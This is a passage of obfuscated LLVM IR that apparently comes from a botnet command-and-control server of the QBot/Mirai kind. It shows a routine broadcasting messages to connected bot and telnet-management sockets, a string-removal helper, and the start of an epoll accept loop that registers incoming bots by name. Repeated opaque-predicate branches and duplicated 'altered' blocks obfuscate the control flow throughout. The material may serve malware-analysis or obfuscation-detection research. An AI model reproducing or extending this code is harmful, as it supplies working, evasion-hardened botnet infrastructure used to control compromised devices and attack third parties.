  %89 = load i32, i32* %13, align 4
  %90 = icmp eq i32 %88, %89
  br i1 %90, label %108, label %91

; <label>:91:                                     ; preds = %87
  %92 = load i32, i32* %21, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %93
  %95 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %94, i32 0, i32 3
  %96 = load i8, i8* %95, align 1
  %97 = icmp ne i8 %96, 0
  br i1 %97, label %109, label %98

; <label>:98:                                     ; preds = %91
  %99 = load i32, i32* %15, align 4
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %108, label %101

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* %21, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %103
  %105 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %109, label %108

; <label>:108:                                    ; preds = %101, %98, %87
  br label %193

; <label>:109:                                    ; preds = %101, %91
  %110 = load i32, i32* %15, align 4
  %111 = icmp ne i32 %110, 0
  br i1 %111, label %112, label %145

; <label>:112:                                    ; preds = %109
  %113 = load i32, i32* %21, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %145

; <label>:119:                                    ; preds = %112
  %120 = load i32, i32* @x.3
  %121 = load i32, i32* @y.4
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %119
  %128 = load i32, i32* %21, align 4
  %129 = call i64 @send(i32 %128, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i64 7, i32 16384)
  %130 = load i32, i32* %21, align 4
  %131 = load i8*, i8** %14, align 8
  %132 = load i8*, i8** %14, align 8
  %133 = call i64 @strlen(i8* %132) #8
  %134 = call i64 @send(i32 %130, i8* %131, i64 %133, i32 16384)
  %135 = load i32, i32* %21, align 4
  %136 = call i64 @send(i32 %135, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  %137 = load i32, i32* @x.3
  %138 = load i32, i32* @y.4
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %145

; <label>:145:                                    ; preds = %originalBBpart212, %112, %109
  %146 = load i32, i32* %21, align 4
  %147 = load i8*, i8** %12, align 8
  %148 = load i8*, i8** %12, align 8
  %149 = call i64 @strlen(i8* %148) #8
  %150 = call i64 @send(i32 %146, i8* %147, i64 %149, i32 16384)
  %151 = getelementptr inbounds [56 x i8], [56 x i8]* %16, i32 0, i32 0
  %152 = load i32, i32* %21, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %153
  %155 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %154, i32 0, i32 2
  %156 = getelementptr inbounds [20 x i8], [20 x i8]* %155, i32 0, i32 0
  %157 = call i32 (i8*, i8*, ...) @sprintf(i8* %151, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i32 0, i32 0), i8* %156) #7
  %158 = load i32, i32* %15, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %189

; <label>:160:                                    ; preds = %145
  %161 = load i32, i32* @x.3
  %162 = load i32, i32* @y.4
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %160
  %169 = load i32, i32* %21, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %170
  %172 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = icmp ne i32 %173, 0
  %175 = load i32, i32* @x.3
  %176 = load i32, i32* @y.4
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %174, label %183, label %189

; <label>:183:                                    ; preds = %originalBBpart216
  %184 = load i32, i32* %21, align 4
  %185 = getelementptr inbounds [56 x i8], [56 x i8]* %16, i32 0, i32 0
  %186 = getelementptr inbounds [56 x i8], [56 x i8]* %16, i32 0, i32 0
  %187 = call i64 @strlen(i8* %186) #8
  %188 = call i64 @send(i32 %184, i8* %185, i64 %187, i32 16384)
  br label %192

; <label>:189:                                    ; preds = %originalBBpart216, %145
  %190 = load i32, i32* %21, align 4
  %191 = call i64 @send(i32 %190, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i64 1, i32 16384)
  br label %192

; <label>:192:                                    ; preds = %189, %183
  br label %193

; <label>:193:                                    ; preds = %192, %108
  %194 = load i32, i32* @x.3
  %195 = load i32, i32* @y.4
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %193
  %202 = load i32, i32* %21, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %21, align 4
  %204 = load i32, i32* @x.3
  %205 = load i32, i32* @y.4
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %68

; <label>:212:                                    ; preds = %originalBBpart28
  %213 = load i8*, i8** %17, align 8
  call void @free(i8* %213) #7
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %214 = alloca i8*, align 8
  %215 = alloca i32, align 4
  %216 = alloca i8*, align 8
  %217 = alloca i32, align 4
  %218 = alloca [56 x i8], align 16
  %219 = alloca i8*, align 8
  %220 = alloca i64, align 8
  %221 = alloca %struct.tm*, align 8
  %222 = alloca i8*, align 8
  %223 = alloca i32, align 4
  store i8* %0, i8** %214, align 8
  store i32 %1, i32* %215, align 4
  store i8* %2, i8** %216, align 8
  store i32 1, i32* %217, align 4
  %224 = load i8*, i8** %214, align 8
  %225 = call i32 @strcmp(i8* %224, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %226 = icmp eq i32 %225, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  store i32 0, i32* %15, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %227 = load i32, i32* %21, align 4
  %228 = icmp slt i32 %227, 1000000
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %119
  %229 = load i32, i32* %21, align 4
  %230 = call i64 @send(i32 %229, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i64 7, i32 16384)
  %231 = load i32, i32* %21, align 4
  %232 = load i8*, i8** %14, align 8
  %233 = load i8*, i8** %14, align 8
  %234 = call i64 @strlen(i8* %233) #8
  %235 = call i64 @send(i32 %231, i8* %232, i64 %234, i32 16384)
  %236 = load i32, i32* %21, align 4
  %237 = call i64 @send(i32 %236, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %160
  %238 = load i32, i32* %21, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %239
  %241 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %240, i32 0, i32 1
  %242 = load i32, i32* %241, align 4
  %243 = icmp ne i32 %242, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %193
  %244 = load i32, i32* %21, align 4
  %_ = sub i32 %244, 1
  %gen = mul i32 %_, 1
  %_19 = sub i32 0, %244
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 0, %244
  %gen22 = add i32 %_21, 1
  %_23 = sub i32 %244, 1
  %gen24 = mul i32 %_23, 1
  %_25 = shl i32 %244, 1
  %245 = add nsw i32 %244, 1
  store i32 %245, i32* %21, align 4
  br label %originalBB18
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #4

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @removestr(i8*, i8*) #0 {
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %13 = load i8*, i8** %11, align 8
  %14 = load i8*, i8** %12, align 8
  %15 = call i8* @strstr(i8* %13, i8* %14) #8
  store i8* %15, i8** %11, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = load i8*, i8** %11, align 8
  %18 = load i8*, i8** %12, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = load i8*, i8** %11, align 8
  %22 = load i8*, i8** %12, align 8
  %23 = call i64 @strlen(i8* %22) #8
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = call i64 @strlen(i8* %24) #8
  %26 = add i64 1, %25
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %16, i8* %20, i64 %26, i32 1, i1 false)
  %27 = load i32, i32* @x.5
  %28 = load i32, i32* @y.6
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %35 = alloca i8*, align 8
  %36 = alloca i8*, align 8
  store i8* %0, i8** %35, align 8
  store i8* %1, i8** %36, align 8
  %37 = load i8*, i8** %35, align 8
  %38 = load i8*, i8** %36, align 8
  %39 = call i8* @strstr(i8* %37, i8* %38) #8
  store i8* %39, i8** %35, align 8
  %40 = load i8*, i8** %35, align 8
  %41 = load i8*, i8** %35, align 8
  %42 = load i8*, i8** %36, align 8
  %43 = call i64 @strlen(i8* %42) #8
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = load i8*, i8** %35, align 8
  %46 = load i8*, i8** %36, align 8
  %47 = call i64 @strlen(i8* %46) #8
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @strlen(i8* %48) #8
  %_ = sub i64 0, 1
  %gen = add i64 %_, %49
  %_1 = shl i64 1, %49
  %_2 = sub i64 0, 1
  %gen3 = add i64 %_2, %49
  %50 = add i64 1, %49
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %40, i8* %44, i64 %50, i32 1, i1 false)
  br label %originalBB
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [200 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.clientdata_t*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i64, align 8
  %20 = alloca [2048 x i8], align 16
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %23 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %24 = bitcast i8* %23 to %struct.epoll_event*
  store %struct.epoll_event* %24, %struct.epoll_event** %5, align 8
  br label %25

; <label>:25:                                     ; preds = %648, %1
  %26 = load volatile i32, i32* @epollFD, align 4
  %27 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %28 = call i32 @epoll_wait(i32 %26, %struct.epoll_event* %27, i32 1000000, i32 -1)
  store i32 %28, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %29

; <label>:29:                                     ; preds = %645, %25
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %8, align 4
  %39 = load i32, i32* %7, align 4
  %40 = icmp slt i32 %38, %39
  %41 = load i32, i32* @x.7
  %42 = load i32, i32* @y.8
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %49, label %648

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.7
  %51 = load i32, i32* @y.8
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %58, i64 %60
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 1
  %64 = and i32 %63, 8
  %65 = icmp ne i32 %64, 0
  %66 = load i32, i32* @x.7
  %67 = load i32, i32* @y.8
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br i1 %65, label %124, label %74

; <label>:74:                                     ; preds = %originalBBpart210
  %75 = load i32, i32* @x.7
  %76 = load i32, i32* @y.8
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %74
  %83 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %83, i64 %85
  %87 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 1
  %89 = and i32 %88, 16
  %90 = icmp ne i32 %89, 0
  %91 = load i32, i32* @x.7
  %92 = load i32, i32* @y.8
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart223, label %originalBB12alteredBB

originalBBpart223:                                ; preds = %originalBB12
  br i1 %90, label %124, label %99

; <label>:99:                                     ; preds = %originalBBpart223
  %100 = load i32, i32* @x.7
  %101 = load i32, i32* @y.8
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %99
  %108 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %109 = load i32, i32* %8, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %108, i64 %110
  %112 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %111, i32 0, i32 0
  %113 = load i32, i32* %112, align 1
  %114 = and i32 %113, 1
  %115 = icmp ne i32 %114, 0
  %116 = load i32, i32* @x.7
  %117 = load i32, i32* @y.8
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart235, label %originalBB25alteredBB

originalBBpart235:                                ; preds = %originalBB25
  br i1 %115, label %143, label %124

; <label>:124:                                    ; preds = %originalBBpart235, %originalBBpart223, %originalBBpart210
  %125 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %126 = load i32, i32* %8, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %125, i64 %127
  %129 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %128, i32 0, i32 1
  %130 = bitcast %union.epoll_data* %129 to i32*
  %131 = load i32, i32* %130, align 1
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %132
  %134 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %133, i32 0, i32 3
  store i8 0, i8* %134, align 1
  %135 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %135, i64 %137
  %139 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %138, i32 0, i32 1
  %140 = bitcast %union.epoll_data* %139 to i32*
  %141 = load i32, i32* %140, align 1
  %142 = call i32 @close(i32 %141)
  br label %645

; <label>:143:                                    ; preds = %originalBBpart235
  %144 = load volatile i32, i32* @listenFD, align 4
  %145 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %146 = load i32, i32* %8, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %145, i64 %147
  %149 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %148, i32 0, i32 1
  %150 = bitcast %union.epoll_data* %149 to i32*
  %151 = load i32, i32* %150, align 1
  %152 = icmp eq i32 %144, %151
  br i1 %152, label %153, label %399

; <label>:153:                                    ; preds = %143
  br label %154

; <label>:154:                                    ; preds = %393, %369, %366, %153
  store i32 16, i32* %10, align 4
  %155 = load volatile i32, i32* @listenFD, align 4
  %156 = call i32 @accept(i32 %155, %struct.sockaddr* %9, i32* %10)
  store i32 %156, i32* %11, align 4
  %157 = load i32, i32* %11, align 4
  %158 = icmp eq i32 %157, -1
  br i1 %158, label %159, label %185

; <label>:159:                                    ; preds = %154
  %160 = call i32* @__errno_location() #9
  %161 = load i32, i32* %160, align 4
  %162 = icmp eq i32 %161, 11
  br i1 %162, label %167, label %163

; <label>:163:                                    ; preds = %159
  %164 = call i32* @__errno_location() #9
  %165 = load i32, i32* %164, align 4
  %166 = icmp eq i32 %165, 11
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %163, %159
  br label %398

; <label>:168:                                    ; preds = %163
  %169 = load i32, i32* @x.7
  %170 = load i32, i32* @y.8
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %168
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0))
  %177 = load i32, i32* @x.7
  %178 = load i32, i32* @y.8
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %398

; <label>:185:                                    ; preds = %154
  %186 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %186, i32 0, i32 2
  %188 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 2
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %191
  %193 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %192, i32 0, i32 0
  store i32 %189, i32* %193, align 4
  %194 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %194, i8 0, i64 200, i32 16, i1 false)
  %195 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %196 = load i32, i32* %11, align 4
  %197 = call i32 @fdgets(i8* %195, i32 200, i32 %196)
  %198 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %199 = call i8* @strstr(i8* %198, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0)) #8
  %200 = icmp ne i8* %199, null
  br i1 %200, label %201, label %294

; <label>:201:                                    ; preds = %185
  %202 = load i32, i32* @x.7
  %203 = load i32, i32* @y.8
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %201
  %210 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @trim(i8* %210)
  %211 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @removestr(i8* %211, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0))
  %212 = load i32, i32* %11, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %213
  %215 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %214, i32 0, i32 2
  %216 = getelementptr inbounds [512 x i8], [512 x i8]* %215, i32 0, i32 0
  %217 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %218 = call i8* @strcpy(i8* %216, i8* %217) #7
  store i32 0, i32* %14, align 4
  %219 = load i32, i32* @x.7
  %220 = load i32, i32* @y.8
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %227

; <label>:227:                                    ; preds = %274, %originalBBpart243
  %228 = load i32, i32* %14, align 4
  %229 = icmp slt i32 %228, 40
  br i1 %229, label %230, label %277

; <label>:230:                                    ; preds = %227
  %231 = load i32, i32* %14, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %232
  %234 = getelementptr inbounds %struct.name, %struct.name* %233, i32 0, i32 0
  %235 = getelementptr inbounds [512 x i8], [512 x i8]* %234, i32 0, i32 0
  %236 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %237 = call i32 @strcmp(i8* %235, i8* %236) #8
  %238 = icmp ne i32 %237, 0
  br i1 %238, label %241, label %239

; <label>:239:                                    ; preds = %230
  %240 = call i32 @usleep(i32 40000)
  br label %277

; <label>:241:                                    ; preds = %230
  %242 = load i32, i32* %14, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %243
  %245 = getelementptr inbounds %struct.name, %struct.name* %244, i32 0, i32 0
  %246 = getelementptr inbounds [512 x i8], [512 x i8]* %245, i32 0, i32 0
  %247 = call i64 @strlen(i8* %246) #8
  %248 = icmp ule i64 %247, 0
  br i1 %248, label %249, label %273

; <label>:249:                                    ; preds = %241
  %250 = load i32, i32* @x.7
  %251 = load i32, i32* @y.8
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %249
  %258 = load i32, i32* %14, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %259
  %261 = getelementptr inbounds %struct.name, %struct.name* %260, i32 0, i32 0
  %262 = getelementptr inbounds [512 x i8], [512 x i8]* %261, i32 0, i32 0
  %263 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %264 = call i8* @strcpy(i8* %262, i8* %263) #7
  %265 = load i32, i32* @x.7
  %266 = load i32, i32* @y.8
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %277

; <label>:273:                                    ; preds = %241
  br label %274

; <label>:274:                                    ; preds = %273
  %275 = load i32, i32* %14, align 4
  %276 = add nsw i32 %275, 1
  store i32 %276, i32* %14, align 4
  br label %227

; <label>:277:                                    ; preds = %originalBBpart247, %239, %227
  %278 = load i32, i32* @x.7
  %279 = load i32, i32* @y.8
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %277
  %286 = load i32, i32* @x.7
  %287 = load i32, i32* @y.8
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart251, label %originalBB49alteredBB

